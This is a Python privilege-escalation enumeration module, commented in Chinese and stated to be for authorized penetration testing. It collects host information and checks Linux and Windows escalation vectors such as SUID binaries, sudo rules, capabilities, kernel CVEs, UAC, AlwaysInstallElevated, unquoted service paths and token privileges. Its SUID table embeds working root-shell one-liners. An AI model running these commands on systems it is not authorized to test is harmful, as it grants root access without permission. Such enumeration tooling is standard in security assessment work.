#!/usr/bin/env python3
"""
权限枚举模块 - Privilege Enumeration Module

提供系统信息收集和提权向量枚举功能
仅用于授权渗透测试和安全研究
"""

from dataclasses import dataclass, field
from typing import Optional, Dict, Any, List
import platform
import logging
import os

logger = logging.getLogger(__name__)


@dataclass
class SystemInfo:
    """
    系统信息

    收集的目标系统基本信息
    """
    hostname: str = ''
    os_name: str = ''
    os_version: str = ''
    os_release: str = ''
    architecture: str = ''
    kernel_version: str = ''
    current_user: str = ''
    current_uid: int = -1
    home_directory: str = ''
    shell: str = ''
    path: List[str] = field(default_factory=list)
    environment: Dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            'hostname': self.hostname,
            'os_name': self.os_name,
            'os_version': self.os_version,
            'os_release': self.os_release,
            'architecture': self.architecture,
            'kernel_version': self.kernel_version,
            'current_user': self.current_user,
            'current_uid': self.current_uid,
            'home_directory': self.home_directory,
            'shell': self.shell,
            'path': self.path,
        }


@dataclass
class EnumerationResult:
    """
    枚举结果

    包含系统信息和发现的提权向量
    """
    success: bool
    system_info: Optional[SystemInfo] = None
    vectors: List[Dict[str, Any]] = field(default_factory=list)
    error: str = ''
    duration: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            'success': self.success,
            'system_info': self.system_info.to_dict() if self.system_info else None,
            'vectors': self.vectors,
            'vectors_count': len(self.vectors),
            'error': self.error,
            'duration': self.duration,
        }

    def __bool__(self) -> bool:
        return self.success


class PrivilegeEnumerator:
    """
    权限枚举器

    收集系统信息，枚举可能的提权向量

    Usage:
        enumerator = PrivilegeEnumerator()
        result = enumerator.enumerate()
        print(result.system_info)
        print(result.vectors)
    """

    def __init__(self):
        self.logger = logging.getLogger(f"{__name__}.PrivilegeEnumerator")
        self._system_info: Optional[SystemInfo] = None

    def get_system_info(self) -> SystemInfo:
        """
        收集系统信息

        Returns:
            SystemInfo 对象
        """
        if self._system_info:
            return self._system_info

        info = SystemInfo()

        try:
            # 基本系统信息
            info.hostname = platform.node()
            info.os_name = platform.system()
            info.os_version = platform.version()
            info.os_release = platform.release()
            info.architecture = platform.machine()

            # 获取当前用户
            try:
                import getpass
                info.current_user = getpass.getuser()
            except Exception:
                info.current_user = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))

            # 平台特定信息
            if info.os_name.lower() == 'linux':
                info = self._get_linux_info(info)
            elif info.os_name.lower() == 'windows':
                info = self._get_windows_info(info)

            # PATH 环境变量
            path_str = os.environ.get('PATH', '')
            info.path = path_str.split(os.pathsep) if path_str else []

            # 环境变量（过滤敏感信息）
            safe_env_keys = ['HOME', 'USER', 'SHELL', 'PWD', 'LANG', 'PATH', 'TERM']
            info.environment = {
                k: v for k, v in os.environ.items()
                if k in safe_env_keys
            }

            self._system_info = info

        except Exception as e:
            self.logger.error(f"Failed to collect system info: {e}")

        return info

    def _get_linux_info(self, info: SystemInfo) -> SystemInfo:
        """收集 Linux 特定信息"""
        try:
            info.current_uid = os.getuid()
            info.home_directory = os.path.expanduser('~')
            info.shell = os.environ.get('SHELL', '/bin/sh')

            # 读取内核版本
            try:
                with open('/proc/version', 'r', encoding='utf-8') as f:
                    info.kernel_version = f.read().strip()
            except (FileNotFoundError, PermissionError):
                info.kernel_version = platform.release()

        except Exception as e:
            self.logger.warning(f"Linux info collection error: {e}")

        return info

    def _get_windows_info(self, info: SystemInfo) -> SystemInfo:
        """收集 Windows 特定信息"""
        try:
            info.home_directory = os.environ.get('USERPROFILE', '')
            info.shell = os.environ.get('COMSPEC', 'cmd.exe')

            # 获取 Windows 版本详情
            try:
                import subprocess
                result = subprocess.run(
                    ['wmic', 'os', 'get', 'Caption,Version', '/value'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    for line in result.stdout.strip().split('\n'):
                        if line.startswith('Caption='):
                            info.os_version = line.split('=', 1)[1].strip()
            except (subprocess.SubprocessError, FileNotFoundError):
                pass

        except Exception as e:
            self.logger.warning(f"Windows info collection error: {e}")

        return info

    def enumerate(self) -> EnumerationResult:
        """
        执行完整枚举

        Returns:
            EnumerationResult 对象
        """
        import time
        start_time = time.time()

        try:
            system_info = self.get_system_info()

            # 根据平台枚举向量
            if system_info.os_name.lower() == 'linux':
                vectors = self._enumerate_linux_vectors()
            elif system_info.os_name.lower() == 'windows':
                vectors = self._enumerate_windows_vectors()
            else:
                vectors = []

            duration = time.time() - start_time

            return EnumerationResult(
                success=True,
                system_info=system_info,
                vectors=vectors,
                duration=duration
            )

        except Exception as e:
            return EnumerationResult(
                success=False,
                error=str(e),
                duration=time.time() - start_time
            )

    def _enumerate_linux_vectors(self) -> List[Dict[str, Any]]:
        """枚举 Linux 提权向量"""
        vectors = []

        # 检查 SUID 二进制
        suid_vectors = self._check_suid_binaries()
        vectors.extend(suid_vectors)

        # 检查 sudo 配置
        sudo_vectors = self._check_sudo_config()
        vectors.extend(sudo_vectors)

        # 检查 capabilities
        cap_vectors = self._check_capabilities()
        vectors.extend(cap_vectors)

        # 检查可写目录
        writable_vectors = self._check_writable_paths()
        vectors.extend(writable_vectors)

        # 检查内核版本（已知漏洞）
        kernel_vectors = self._check_kernel_exploits()
        vectors.extend(kernel_vectors)

        return vectors

    def _enumerate_windows_vectors(self) -> List[Dict[str, Any]]:
        """枚举 Windows 提权向量"""
        vectors = []

        # 检查 UAC 设置
        uac_vectors = self._check_uac_settings()
        vectors.extend(uac_vectors)

        # 检查 AlwaysInstallElevated
        msi_vectors = self._check_always_install_elevated()
        vectors.extend(msi_vectors)

        # 检查服务配置
        service_vectors = self._check_service_permissions()
        vectors.extend(service_vectors)

        # 检查未引用服务路径
        unquoted_vectors = self._check_unquoted_paths()
        vectors.extend(unquoted_vectors)

        # 检查 Token 权限
        token_vectors = self._check_token_privileges()
        vectors.extend(token_vectors)

        return vectors

    def _check_suid_binaries(self) -> List[Dict[str, Any]]:
        """检查 SUID 二进制"""
        vectors = []

        # 已知可利用的 SUID 二进制
        exploitable_suid = {
            'nmap': ('nmap --interactive', 0.9),
            'vim': ('vim -c ":!sh"', 0.9),
            'find': ('find . -exec /bin/sh -p \\;', 0.9),
            'bash': ('bash -p', 0.95),
            'less': ('less /etc/passwd -> !/bin/sh', 0.8),
            'more': ('more /etc/passwd -> !/bin/sh', 0.8),
            'nano': ('nano -> Ctrl+R -> Ctrl+X -> sh', 0.7),
            'cp': ('cp /bin/sh /tmp/sh; chmod +s /tmp/sh', 0.8),
            'python': ("python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", 0.9),
            'python3': ("python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", 0.9),
            'perl': ("perl -e 'exec \"/bin/sh\";'", 0.9),
            'ruby': ("ruby -e 'exec \"/bin/sh\"'", 0.9),
            'awk': ("awk 'BEGIN {system(\"/bin/sh\")}'", 0.9),
            'env': ('env /bin/sh -p', 0.9),
        }

        try:
            import subprocess
            # 查找 SUID 二进制
            result = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f', '-readable'],
                capture_output=True,
                text=True,
                timeout=30
            )

            suid_files = result.stdout.strip().split('\n') if result.stdout else []

            for suid_path in suid_files:
                if not suid_path:
                    continue

                binary_name = os.path.basename(suid_path)
                if binary_name in exploitable_suid:
                    exploit_cmd, probability = exploitable_suid[binary_name]
                    vectors.append({
                        'method': 'suid',
                        'name': f'SUID {binary_name}',
                        'description': f'利用 SUID {binary_name} 提权',
                        'success_probability': probability,
                        'requires_interaction': False,
                        'detected_info': {
                            'path': suid_path,
                            'exploit_command': exploit_cmd,
                        }
                    })

        except (subprocess.SubprocessError, FileNotFoundError) as e:
            self.logger.debug(f"SUID check error: {e}")

        return vectors

    def _check_sudo_config(self) -> List[Dict[str, Any]]:
        """检查 sudo 配置"""
        vectors = []

        try:
            import subprocess

            # 检查 sudo -l 输出
            result = subprocess.run(
                ['sudo', '-l'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0 and result.stdout:
                output = result.stdout

                # 检查 NOPASSWD
                if 'NOPASSWD' in output:
                    vectors.append({
                        'method': 'sudo',
                        'name': 'Sudo NOPASSWD',
                        'description': '发现 sudo NOPASSWD 配置',
                        'success_probability': 0.9,
                        'requires_interaction': False,
                        'detected_info': {
                            'sudo_output': output[:500],
                        }
                    })

                # 检查可以运行 /bin/sh 或 /bin/bash
                if '/bin/sh' in output or '/bin/bash' in output:
                    vectors.append({
                        'method': 'sudo',
                        'name': 'Sudo Shell',
                        'description': 'sudo 允许执行 shell',
                        'success_probability': 0.95,
                        'requires_interaction': False,
                        'detected_info': {
                            'command': 'sudo /bin/sh',
                        }
                    })

        except (subprocess.SubprocessError, FileNotFoundError) as e:
            self.logger.debug(f"Sudo check error: {e}")

        return vectors

    def _check_capabilities(self) -> List[Dict[str, Any]]:
        """检查 Linux Capabilities"""
        vectors = []

        # 已知可利用的 capabilities
        exploitable_caps = {
            'cap_setuid': 0.9,
            'cap_setgid': 0.8,
            'cap_dac_override': 0.7,
            'cap_dac_read_search': 0.6,
            'cap_sys_admin': 0.9,
            'cap_sys_ptrace': 0.7,
        }

        try:
            import subprocess
            result = subprocess.run(
                ['getcap', '-r', '/'],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0 and result.stdout:
                for line in result.stdout.strip().split('\n'):
                    if not line:
                        continue
                    for cap, probability in exploitable_caps.items():
                        if cap in line.lower():
                            vectors.append({
                                'method': 'capability',
                                'name': f'Capability {cap}',
                                'description': f'发现可利用的 capability: {cap}',
                                'success_probability': probability,
                                'requires_interaction': False,
                                'detected_info': {
                                    'line': line,
                                    'capability': cap,
                                }
                            })
                            break

        except (subprocess.SubprocessError, FileNotFoundError) as e:
            self.logger.debug(f"Capability check error: {e}")

        return vectors

    def _check_writable_paths(self) -> List[Dict[str, Any]]:
        """检查可写目录"""
        vectors = []

        # 检查 PATH 中的可写目录
        path_dirs = os.environ.get('PATH', '').split(':')

        for path_dir in path_dirs:
            if path_dir and os.path.isdir(path_dir):
                if os.access(path_dir, os.W_OK):
                    vectors.append({
                        'method': 'path_hijack',
                        'name': f'Writable PATH: {path_dir}',
                        'description': f'PATH 中存在可写目录: {path_dir}',
                        'success_probability': 0.5,
                        'requires_interaction': False,
                        'detected_info': {
                            'writable_path': path_dir,
                        }
                    })

        return vectors

    def _check_kernel_exploits(self) -> List[Dict[str, Any]]:
        """检查已知内核漏洞"""
        vectors = []

        try:
            kernel_release = platform.release()

            # 已知易受攻击的内核版本（示例）
            vulnerable_kernels = {
                '3.13.0': ('overlayfs', 'CVE-2015-1328', 0.7),
                '4.4.0': ('dirty_cow', 'CVE-2016-5195', 0.8),
                '4.8.0': ('exploit_sock_sendpage', 'CVE-2017-7308', 0.6),
            }

            for version_prefix, (name, cve, probability) in vulnerable_kernels.items():
                if kernel_release.startswith(version_prefix):
                    vectors.append({
                        'method': 'kernel',
                        'name': f'Kernel {name}',
                        'description': f'内核版本可能存在漏洞: {cve}',
                        'success_probability': probability,
                        'requires_interaction': False,
                        'detected_info': {
                            'kernel_version': kernel_release,
                            'cve': cve,
                            'exploit_name': name,
                        }
                    })

        except Exception as e:
            self.logger.debug(f"Kernel check error: {e}")

        return vectors

    def _check_uac_settings(self) -> List[Dict[str, Any]]:
        """检查 Windows UAC 设置"""
        vectors = []

        try:
            import subprocess

            # 查询 UAC 注册表设置
            result = subprocess.run(
                ['reg', 'query', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
                 '/v', 'EnableLUA'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0 and '0x0' in result.stdout:
                vectors.append({
                    'method': 'uac_bypass',
                    'name': 'UAC Disabled',
                    'description': 'UAC 已禁用',
                    'success_probability': 0.95,
                    'requires_interaction': False,
                    'detected_info': {
                        'uac_status': 'disabled',
                    }
                })
            else:
                # UAC 启用，检查可用的绕过方法
                vectors.append({
                    'method': 'uac_bypass',
                    'name': 'UAC Bypass (fodhelper)',
                    'description': '尝试使用 fodhelper.exe 绕过 UAC',
                    'success_probability': 0.7,
                    'requires_interaction': False,
                    'detected_info': {
                        'technique': 'fodhelper',
                    }
                })
                vectors.append({
                    'method': 'uac_bypass',
                    'name': 'UAC Bypass (eventvwr)',
                    'description': '尝试使用 eventvwr.exe 绕过 UAC',
                    'success_probability': 0.6,
                    'requires_interaction': False,
                    'detected_info': {
                        'technique': 'eventvwr',
                    }
                })

        except (subprocess.SubprocessError, FileNotFoundError) as e:
            self.logger.debug(f"UAC check error: {e}")

        return vectors

    def _check_always_install_elevated(self) -> List[Dict[str, Any]]:
        """检查 AlwaysInstallElevated 策略"""
        vectors = []

        try:
            import subprocess

            # 检查 HKCU
            result_hkcu = subprocess.run(
                ['reg', 'query', 'HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer',
                 '/v', 'AlwaysInstallElevated'],
                capture_output=True,
                text=True,
                timeout=10
            )

            # 检查 HKLM
            result_hklm = subprocess.run(
                ['reg', 'query', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer',
                 '/v', 'AlwaysInstallElevated'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if ('0x1' in result_hkcu.stdout and '0x1' in result_hklm.stdout):
                vectors.append({
                    'method': 'always_install_elevated',
                    'name': 'AlwaysInstallElevated',
                    'description': 'AlwaysInstallElevated 策略已启用',
                    'success_probability': 0.9,
                    'requires_interaction': False,
                    'detected_info': {
                        'hkcu': '0x1',
                        'hklm': '0x1',
                    }
                })

        except (subprocess.SubprocessError, FileNotFoundError) as e:
            self.logger.debug(f"AlwaysInstallElevated check error: {e}")

        return vectors

    def _check_service_permissions(self) -> List[Dict[str, Any]]:
        """检查服务权限配置"""
        vectors = []

        # 此处实现服务权限检查逻辑
        # 省略详细实现

        return vectors

    def _check_unquoted_paths(self) -> List[Dict[str, Any]]:
        """检查未引用的服务路径"""
        vectors = []

        try:
            import subprocess

            result = subprocess.run(
                ['wmic', 'service', 'get', 'name,displayname,pathname,startmode'],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                for line in result.stdout.strip().split('\n')[1:]:
                    # 检查包含空格但未用引号的路径
                    if ' ' in line and '"' not in line and 'C:\\' in line:
                        vectors.append({
                            'method': 'unquoted_service_path',
                            'name': 'Unquoted Service Path',
                            'description': f'发现未引用的服务路径',
                            'success_probability': 0.6,
                            'requires_interaction': False,
                            'detected_info': {
                                'service_info': line[:200],
                            }
                        })
                        break  # 只报告第一个

        except (subprocess.SubprocessError, FileNotFoundError) as e:
            self.logger.debug(f"Unquoted path check error: {e}")

        return vectors

    def _check_token_privileges(self) -> List[Dict[str, Any]]:
        """检查 Token 权限"""
        vectors = []

        try:
            import subprocess

            result = subprocess.run(
                ['whoami', '/priv'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                output = result.stdout

                # 检查 SeImpersonatePrivilege（Potato 攻击）
                if 'SeImpersonatePrivilege' in output and 'Enabled' in output:
                    vectors.append({
                        'method': 'potato',
                        'name': 'SeImpersonatePrivilege',
                        'description': 'SeImpersonatePrivilege 已启用，可尝试 Potato 攻击',
                        'success_probability': 0.8,
                        'requires_interaction': False,
                        'detected_info': {
                            'privilege': 'SeImpersonatePrivilege',
                        }
                    })

                # 检查 SeAssignPrimaryTokenPrivilege
                if 'SeAssignPrimaryTokenPrivilege' in output and 'Enabled' in output:
                    vectors.append({
                        'method': 'token_impersonation',
                        'name': 'SeAssignPrimaryTokenPrivilege',
                        'description': 'SeAssignPrimaryTokenPrivilege 已启用',
                        'success_probability': 0.7,
                        'requires_interaction': False,
                        'detected_info': {
                            'privilege': 'SeAssignPrimaryTokenPrivilege',
                        }
                    })

                # 检查 SeDebugPrivilege
                if 'SeDebugPrivilege' in output and 'Enabled' in output:
                    vectors.append({
                        'method': 'token_impersonation',
                        'name': 'SeDebugPrivilege',
                        'description': 'SeDebugPrivilege 已启用，可进行进程注入',
                        'success_probability': 0.75,
                        'requires_interaction': False,
                        'detected_info': {
                            'privilege': 'SeDebugPrivilege',
                        }
                    })

        except (subprocess.SubprocessError, FileNotFoundError) as e:
            self.logger.debug(f"Token privilege check error: {e}")

        return vectors


__all__ = [
    'SystemInfo',
    'EnumerationResult',
    'PrivilegeEnumerator',
]
